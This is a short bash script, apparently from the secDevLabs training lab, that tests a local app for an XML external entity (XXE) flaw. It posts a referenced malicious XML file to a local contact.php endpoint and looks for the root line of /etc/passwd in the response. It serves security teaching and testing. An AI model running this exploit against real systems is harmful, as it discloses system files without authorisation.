#!/bin/bash
#
# This script verifies if app is vulnerable to the attack narrative
#

echo "secDevLabs: Exploiting your app locally!"
echo "XXE to retrieve sensitive information"

echo

echo "Response:"

response=$(curl -s -d @deployments/evilxml.xml localhost:10004/contact.php ; echo);

if [ "$(echo $response | grep 'root:x:0:0:root:/root:/bin/bash')" != "" ]; then
    echo "The app is vulnerable.";
else
    echo "Congrats! The app could not be exploited!";
fi